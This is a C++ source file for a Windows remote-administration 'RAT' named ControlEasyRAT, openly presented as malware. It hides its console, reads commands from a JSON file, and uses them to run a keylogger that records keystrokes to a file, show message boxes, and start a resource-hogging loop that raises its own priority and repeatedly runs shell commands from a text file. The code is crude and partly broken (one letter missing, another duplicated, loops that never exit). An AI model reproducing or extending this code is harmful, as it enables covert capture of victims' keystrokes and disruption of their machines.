#include <iostream>
#include <windows.h>
#include <fstream>
#include <stdio.h>
#include <string>
#include <sys/stat.h>
#include <nlohmann/json.hpp>
#pragma comment(lib,"ntdll.lib")
#define MessageBox MessageBoxW
using json = nlohmann::json;
using namespace std;
#define EXTERN_C



class rat {
public:
    json j;
    void keylogger() {
        while (true) {
            Sleep(100);
            if (GetKeyState('A') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'A';
            }
            else if (GetKeyState('B') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'B';
            }
            else if (GetKeyState('C') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'C';
            }
            else if (GetKeyState('D') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'D';
            }
            else if (GetKeyState('E') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'E';
            }
            else if (GetKeyState('F') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'F';
            }
            else if (GetKeyState('G') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'G';
            }
            else if (GetKeyState('H') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'H';
            }
            else if (GetKeyState('I') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'I';
            }
            else if (GetKeyState('J') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'J';
            }
            else if (GetKeyState('K') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'K';
            }
            else if (GetKeyState('L') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'L';
            }
            else if (GetKeyState('M') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'M';
            }
            else if (GetKeyState('O') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'O';
            }
            else if (GetKeyState('P') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'P';
            }
            else if (GetKeyState('Q') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'Q';
            }
            else if (GetKeyState('R') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'R';
            }
            else if (GetKeyState('S') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'S';
            }
            else if (GetKeyState('T') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'T';
            }
            else if (GetKeyState('U') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'U';
            }
            else if (GetKeyState('V') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'V';
            }
            else if (GetKeyState('V') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'V';
            }
            else if (GetKeyState('W') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'W';
            }
            else if (GetKeyState('X') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'X';
            }
            else if (GetKeyState('Y') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'Y';
            }
            else if (GetKeyState('Z') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'Z';
            }
            else if (GetKeyState('@') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '@';
            }
            else if (GetKeyState('!') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '!';
            }
            else if (GetKeyState('§') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '§';
            }
            else if (GetKeyState('%') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '%';
            }
            else if (GetKeyState('&') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '&';
            }
            else if (GetKeyState('/') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '/';
            }
            else if (GetKeyState('=') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '=';
            }
            else if (GetKeyState('(') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '(';
            }
            else if (GetKeyState(')') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << ')';
            }
            else if (GetKeyState('?') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '?';
            }
            else if (GetKeyState('ß') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << 'ß';
            }
            else if (GetKeyState('#') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '#';
            }
            else if (GetKeyState('*') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '*';
            }
            else if (GetKeyState('+') & 0x8000) {
                ofstream write;
                write.open("fun.txt", ios::app);
                write << '+';
            }
        }   
    }
    void sShowMessage(string x) {
        char message[256];
        sprintf_s(message, x.c_str());
        MessageBoxA(NULL, message, "Scripteds cool rat tool", MB_ICONERROR);
    }

    void spamram() {
        SetPriorityClass(GetCurrentProcess(), REALTIME_PRIORITY_CLASS);
        while (true) {
            while (true) {
                fstream file;
                string name;
                file.open("Name.txt", ios::in);
                getline(file, name);
                file.close();
                WaitForSingleObject(GetCurrentProcess(), 0.000000000000000000000001);
                system(name.c_str());
            }
        }
    }



    void rat_main() {
        struct stat st;
        HWND window;
        AllocConsole();
        ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0);
        fstream file;
        file.open("settings.json", ios::in);
        file >> j;
        file.close();
        if (j["started"] == true) {
            ofstream file1("settings.json");
            j["keylogger"] = false;
            j["shutdown"] = false;
            j["show_message"] = "";
            j["slow_comp"] = false;
            j["started"] = false;
            file1 << j;
            file1.close();
        }
        else;
        while (true) {
            Sleep(1000);
            file.open("settings.json", ios::in);
            file >> j;
            if (file.is_open()) {
                file.close();
                if (j["keylogger"] == true) {
                    file.close();
                    keylogger();
                    file.open("fun.txt", ios::out);
                    file << "";
                    file.close();

                }
                else if (j["show_message"] != ""){
                    file.close();
                    string text;
                    sShowMessage(j["show_message"]);
                    j["show_message"] = false;
                    ofstream file1("settings.json");
                    file1 << j;
                    file1.close();
                    remove("message.txt");
                    file.open("fun.txt", ios::out);
                    file << "";
                    file.close();
                }
                else if (j["slow_comp"] == true) {
                    spamram();
                }
            }
        }
    }

    };

    int main(int argc, char* argv[]) {
        system("title ControlEasyRAT Made by Scripted on GitHub");
        rat obj;
        obj.rat_main();

};